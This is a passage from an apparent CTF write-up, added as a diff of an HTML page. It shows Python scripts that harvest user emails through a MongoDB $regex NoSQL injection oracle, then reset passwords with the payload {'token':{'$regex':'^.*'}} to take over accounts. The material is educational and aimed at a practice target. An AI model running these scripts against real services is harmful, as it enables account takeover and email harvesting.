+</span></span><span style="display:flex;"><span>                        should_pop <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> should_pop:
+</span></span><span style="display:flex;"><span>                    stack<span style="color:#f92672">.</span>pop()
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># advance idx until we find a character whose normalized form we have not tried yet</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> idx <span style="color:#f92672">&lt;</span> len(char_order) <span style="color:#f92672">and</span> char_order[idx]<span style="color:#f92672">.</span>lower() <span style="color:#f92672">in</span> tried_norm:
+</span></span><span style="display:flex;"><span>            idx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> idx <span style="color:#f92672">&gt;=</span> len(char_order) <span style="color:#f92672">or</span> len(prefix) <span style="color:#f92672">&gt;=</span> MAX_LEN:
+</span></span><span style="display:flex;"><span>            stack<span style="color:#f92672">.</span>pop()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ch <span style="color:#f92672">=</span> char_order[idx]
+</span></span><span style="display:flex;"><span>        tried_norm<span style="color:#f92672">.</span>add(ch<span style="color:#f92672">.</span>lower())
+</span></span><span style="display:flex;"><span>        stack[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> (prefix, idx <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, tried_norm, char_order)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        candidate <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> ch
+</span></span><span style="display:flex;"><span>        regex: str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;^&#34;</span> <span style="color:#f92672">+</span> re<span style="color:#f92672">.</span>escape(candidate) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.*&#34;</span>
+</span></span><span style="display:flex;"><span>        attempt_counter <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">Attempt </span><span style="color:#e6db74">{</span>attempt_counter<span style="color:#e6db74">:</span><span style="color:#e6db74">&gt;6</span><span style="color:#e6db74">}</span><span style="color:#e6db74">: trying &#39;</span><span style="color:#e6db74">{</span>candidate<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>)
+</span></span><span style="display:flex;"><span>        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
+</span></span><span style="display:flex;"><span>        hit, _ <span style="color:#f92672">=</span> probe_regex(regex)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> hit:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">Attempt </span><span style="color:#e6db74">{</span>attempt_counter<span style="color:#e6db74">:</span><span style="color:#e6db74">&gt;6</span><span style="color:#e6db74">}</span><span style="color:#e6db74">: ✓ &#39;</span><span style="color:#e6db74">{</span>candidate<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        candidate_lower <span style="color:#f92672">=</span> candidate<span style="color:#f92672">.</span>lower()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(candidate) <span style="color:#f92672">&lt;</span> MAX_LEN <span style="color:#f92672">and</span> candidate_lower <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> prune_prefixes:
+</span></span><span style="display:flex;"><span>            stack<span style="color:#f92672">.</span>append(
+</span></span><span style="display:flex;"><span>                (candidate, <span style="color:#ae81ff">0</span>, set(), build_char_order(candidate, known_paths))
+</span></span><span style="display:flex;"><span>            )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">yield</span> candidate, attempt_counter
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">plausible_email</span>(s):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;@&#34;</span> <span style="color:#f92672">in</span> s <span style="color:#f92672">and</span> <span style="color:#e6db74">&#34;.&#34;</span> <span style="color:#f92672">in</span> s<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;@&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">verify_exact</span>(email) <span style="color:#f92672">-&gt;</span> bool:
+</span></span><span style="display:flex;"><span>    regex <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;^&#34;</span> <span style="color:#f92672">+</span> re<span style="color:#f92672">.</span>escape(email) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;$&#34;</span>
+</span></span><span style="display:flex;"><span>    hit, _ <span style="color:#f92672">=</span> probe_regex(regex)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> hit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">load_existing_found</span>(path: str) <span style="color:#f92672">-&gt;</span> set[str]:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(path):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> set()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(path, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> {line<span style="color:#f92672">.</span>strip() <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> f <span style="color:#66d9ef">if</span> line<span style="color:#f92672">.</span>strip()}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">persist_found</span>(sorted_emails: list[str], path: str) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(path, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> email <span style="color:#f92672">in</span> sorted_emails:
+</span></span><span style="display:flex;"><span>            f<span style="color:#f92672">.</span>write(email <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    found <span style="color:#f92672">=</span> load_existing_found(SAVE_FILE)
+</span></span><span style="display:flex;"><span>    found_lower <span style="color:#f92672">=</span> {email<span style="color:#f92672">.</span>lower() <span style="color:#66d9ef">for</span> email <span style="color:#f92672">in</span> found}
+</span></span><span style="display:flex;"><span>    tested_exact: set[str] <span style="color:#f92672">=</span> set()
+</span></span><span style="display:flex;"><span>    known_paths <span style="color:#f92672">=</span> build_known_paths(found)
+</span></span><span style="display:flex;"><span>    known_domains <span style="color:#f92672">=</span> load_domain_candidates(found, extra_paths<span style="color:#f92672">=</span>[EXTRA_EMAILS_FILE])
+</span></span><span style="display:flex;"><span>    domain_guess_attempted: set[str] <span style="color:#f92672">=</span> set()
+</span></span><span style="display:flex;"><span>    prune_prefixes: set[str] <span style="color:#f92672">=</span> set(found_lower)
+</span></span><span style="display:flex;"><span>    verified_domains_by_local: dict[str, set[str]] <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> email <span style="color:#f92672">in</span> found_lower:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;@&#34;</span> <span style="color:#f92672">in</span> email:
+</span></span><span style="display:flex;"><span>            local, domain <span style="color:#f92672">=</span> email<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;@&#34;</span>, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>            verified_domains_by_local<span style="color:#f92672">.</span>setdefault(local, set())<span style="color:#f92672">.</span>add(domain)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> found:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Loaded </span><span style="color:#e6db74">{</span>len(found)<span style="color:#e6db74">}</span><span style="color:#e6db74"> known email(s) from </span><span style="color:#e6db74">{</span>SAVE_FILE<span style="color:#e6db74">}</span><span style="color:#e6db74">.&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> candidate, attempt_no <span style="color:#f92672">in</span> enumerate_prefixes(<span style="color:#e6db74">&#34;&#34;</span>, known_paths, prune_prefixes, verified_domains_by_local):
+</span></span><span style="display:flex;"><span>            candidate_lower <span style="color:#f92672">=</span> candidate<span style="color:#f92672">.</span>lower()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> candidate_lower <span style="color:#f92672">in</span> found_lower:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> candidate_lower <span style="color:#f92672">in</span> tested_exact:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;@&#34;</span> <span style="color:#f92672">in</span> candidate:
+</span></span><span style="display:flex;"><span>                local_part, domain_prefix <span style="color:#f92672">=</span> candidate<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;@&#34;</span>, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> local_part:
+</span></span><span style="display:flex;"><span>                    try_domain_guesses(
+</span></span><span style="display:flex;"><span>                        local_part,
+</span></span><span style="display:flex;"><span>                        domain_prefix,
+</span></span><span style="display:flex;"><span>                        known_domains,
+</span></span><span style="display:flex;"><span>                        found,
+</span></span><span style="display:flex;"><span>                        found_lower,
+</span></span><span style="display:flex;"><span>                        tested_exact,
+</span></span><span style="display:flex;"><span>                        domain_guess_attempted,
+</span></span><span style="display:flex;"><span>                        known_paths,
+</span></span><span style="display:flex;"><span>                        prune_prefixes,
+</span></span><span style="display:flex;"><span>                        verified_domains_by_local,
+</span></span><span style="display:flex;"><span>                    )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> plausible_email(candidate):
+</span></span><span style="display:flex;"><span>                tested_exact<span style="color:#f92672">.</span>add(candidate_lower)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> verify_exact(candidate):
+</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34; VERIFIED: </span><span style="color:#e6db74">{</span>candidate<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                    found<span style="color:#f92672">.</span>add(candidate)
+</span></span><span style="display:flex;"><span>                    found_lower<span style="color:#f92672">.</span>add(candidate_lower)
+</span></span><span style="display:flex;"><span>                    prune_prefixes<span style="color:#f92672">.</span>add(candidate_lower)
+</span></span><span style="display:flex;"><span>                    persist_found(sorted(found, key<span style="color:#f92672">=</span>str<span style="color:#f92672">.</span>lower), SAVE_FILE)
+</span></span><span style="display:flex;"><span>                    known_paths<span style="color:#f92672">.</span>clear()
+</span></span><span style="display:flex;"><span>                    known_paths<span style="color:#f92672">.</span>update(build_known_paths(found))
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;@&#34;</span> <span style="color:#f92672">in</span> candidate:
+</span></span><span style="display:flex;"><span>                        domain <span style="color:#f92672">=</span> candidate<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;@&#34;</span>, <span style="color:#ae81ff">1</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>lower()
+</span></span><span style="display:flex;"><span>                        known_domains<span style="color:#f92672">.</span>add(domain)
+</span></span><span style="display:flex;"><span>                        verified_domains_by_local<span style="color:#f92672">.</span>setdefault(
+</span></span><span style="display:flex;"><span>                            candidate<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;@&#34;</span>, <span style="color:#ae81ff">1</span>)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>lower(), set()
+</span></span><span style="display:flex;"><span>                        )<span style="color:#f92672">.</span>add(domain)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34; plausible but not exact yet: </span><span style="color:#e6db74">{</span>candidate<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyboardInterrupt</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Interrupted by user.&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> found:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Current collected emails (</span><span style="color:#e6db74">{</span>len(found)<span style="color:#e6db74">}</span><span style="color:#e6db74"> total):&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> e <span style="color:#f92672">in</span> sorted(found, key<span style="color:#f92672">=</span>str<span style="color:#f92672">.</span>lower):
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;-&#34;</span>, e)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;No verified emails collected yet.&#34;</span>)
+</span></span></code></pre></div><hr>
+<h2 id="4-weaponizing-the-reset-endpoint-execute_requestspy">4. Weaponizing the Reset Endpoint (<code>execute_requests.py</code>)</h2>
+<p>Resetting passwords one-by-one with curl is error-prone, especially because the <code>$regex</code> token bypass occasionally resets the <em>wrong</em> user (whichever Mongo returns first). The helper script automates the entire workflow safely:</p>
+<ol>
+<li>
+<p><strong>Preflight login.</strong><br>
+For each email in <code>emails_found.txt</code>, the script first tries to log in with our chosen password. If that already works we skip the reset loop entirely.</p>
+</li>
+<li>
+<p><strong>Trigger token generation.</strong><br>
+We still call <code>/api/forgot-password</code> to ensure the backend creates or refreshes a reset token.</p>
+</li>
+<li>
+<p><strong>Reset &amp; login loop (up to XXX attempts).</strong></p>
+<ul>
+<li>POST <code>{&quot;token&quot;:{&quot;$regex&quot;:&quot;^.*&quot;},&quot;newPassword&quot;:&quot;password&quot;}</code> to <code>/api/reset-password</code>.</li>
+<li>Immediately attempt login.</li>
+<li>Record both responses for later analysis.</li>
+<li>Break early if the login succeeds.</li>
+</ul>
+</li>
+<li>
+<p><strong>Logging.</strong><br>
+Each result is saved to <code>login_results.json</code> with status codes and response snippets so we can prove which accounts were taken over.</p>
+</li>
+</ol>
+<p>By iterating this loop we eventually hit the correct token document for each target user. Once their password was set, the plain login endpoint granted us full access. We had a if statement to check to see if the response contained the flag format, and sure enough one of the accounts held the prize.</p>
+<p>The power of hand sight, if we inverted the order of digits vs letters in the charset we could have shaved off hours of enumeration time. Still, the scripts worked reliably
+and managed to get us the flag eventually.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pathlib <span style="color:#f92672">import</span> Path
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> typing <span style="color:#f92672">import</span> Any, Dict, Optional
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>BASE_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://btdlzxnu.playat.flagyard.com&#34;</span>
+</span></span><span style="display:flex;"><span>PASSWORD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;password&#34;</span>
+</span></span><span style="display:flex;"><span>MAX_RESET_ATTEMPTS <span style="color:#f92672">=</span> <span style="color:#ae81ff">100</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>BASE_HEADERS <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/json&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Accept&#34;</span>: <span style="color:#e6db74">&#34;*/*&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;User-Agent&#34;</span>: <span style="color:#e6db74">&#34;Mozilla/5.0 (X11; Linux x86_64)&#34;</span>,
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RESET_PAYLOAD <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;token&#34;</span>: {<span style="color:#e6db74">&#34;$regex&#34;</span>: <span style="color:#e6db74">&#34;^.*&#34;</span>}, <span style="color:#e6db74">&#34;newPassword&#34;</span>: PASSWORD}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">request_login</span>(email: str, password: str) <span style="color:#f92672">-&gt;</span> requests<span style="color:#f92672">.</span>Response:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>BASE_URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/api/login&#34;</span>, json<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;email&#34;</span>: email, <span style="color:#e6db74">&#34;password&#34;</span>: password}, headers<span style="color:#f92672">=</span>BASE_HEADERS)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">request_forgot</span>(email: str) <span style="color:#f92672">-&gt;</span> requests<span style="color:#f92672">.</span>Response:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>BASE_URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/api/forgot-password&#34;</span>, json<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;email&#34;</span>: email}, headers<span style="color:#f92672">=</span>BASE_HEADERS)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">request_reset</span>(payload: Optional[Dict[str, Any]] <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>) <span style="color:#f92672">-&gt;</span> requests<span style="color:#f92672">.</span>Response:
+</span></span><span style="display:flex;"><span>    body <span style="color:#f92672">=</span> payload <span style="color:#f92672">or</span> RESET_PAYLOAD
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>BASE_URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/api/reset-password&#34;</span>, json<span style="color:#f92672">=</span>body, headers<span style="color:#f92672">=</span>BASE_HEADERS)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>emails_file <span style="color:#f92672">=</span> Path(<span style="color:#e6db74">&#34;emails_found.txt&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> emails_file<span style="color:#f92672">.</span>exists():
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Emails file &#39;</span><span style="color:#e6db74">{</span>emails_file<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; not found. Please run mail_extractor.py first.&#34;</span>)
+</span></span><span style="display:flex;"><span>    sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>emails: list[str] <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    line<span style="color:#f92672">.</span>strip() <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> emails_file<span style="color:#f92672">.</span>read_text()<span style="color:#f92672">.</span>splitlines() <span style="color:#66d9ef">if</span> line<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Store login results</span>
+</span></span><span style="display:flex;"><span>login_results <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Process each email</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> email <span style="color:#f92672">in</span> emails:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">{</span><span style="color:#e6db74">&#39;=&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">60</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Processing email: </span><span style="color:#e6db74">{</span>email<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;=&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">60</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    result: Dict[str, Any] <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;email&#34;</span>: email, <span style="color:#e6db74">&#34;attempts&#34;</span>: []}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Step 0: preflight login check</span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[0/3] Checking existing login for </span><span style="color:#e6db74">{</span>email<span style="color:#e6db74">}</span><span style="color:#e6db74">...&#34;</span>)
+</span></span><span style="display:flex;"><span>        preflight_login <span style="color:#f92672">=</span> request_login(email, PASSWORD)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Response Status: </span><span style="color:#e6db74">{</span>preflight_login<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Response: </span><span style="color:#e6db74">{</span>preflight_login<span style="color:#f92672">.</span>text[:<span style="color:#ae81ff">200</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        result[<span style="color:#e6db74">&#34;preflight_status&#34;</span>] <span style="color:#f92672">=</span> preflight_login<span style="color:#f92672">.</span>status_code
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> preflight_login<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;Login already successful; skipping reset workflow.&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;flag&#34;</span> <span style="color:#f92672">in</span> preflight_login<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>lower():
+</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">&#34;Flag detected in reset response!&#34;</span>)
+</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Response: </span><span style="color:#e6db74">{</span>preflight_login<span style="color:#f92672">.</span>text<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                    sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>                result[<span style="color:#e6db74">&#34;response&#34;</span>] <span style="color:#f92672">=</span> preflight_login<span style="color:#f92672">.</span>json()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>                result[<span style="color:#e6db74">&#34;response&#34;</span>] <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;raw&#34;</span>: preflight_login<span style="color:#f92672">.</span>text,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;status_code&#34;</span>: preflight_login<span style="color:#f92672">.</span>status_code,
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            result[<span style="color:#e6db74">&#34;status_code&#34;</span>] <span style="color:#f92672">=</span> preflight_login<span style="color:#f92672">.</span>status_code
+</span></span><span style="display:flex;"><span>            result[<span style="color:#e6db74">&#34;skipped_reset&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>            login_results<span style="color:#f92672">.</span>append(result)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Step 1: Request password reset token generation</span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[1/3] Requesting password reset for </span><span style="color:#e6db74">{</span>email<span style="color:#e6db74">}</span><span style="color:#e6db74">...&#34;</span>)
+</span></span><span style="display:flex;"><span>        forgot_response <span style="color:#f92672">=</span> request_forgot(email)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Response Status: </span><span style="color:#e6db74">{</span>forgot_response<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Response: </span><span style="color:#e6db74">{</span>forgot_response<span style="color:#f92672">.</span>text[:<span style="color:#ae81ff">200</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        result[<span style="color:#e6db74">&#34;forgot_status&#34;</span>] <span style="color:#f92672">=</span> forgot_response<span style="color:#f92672">.</span>status_code
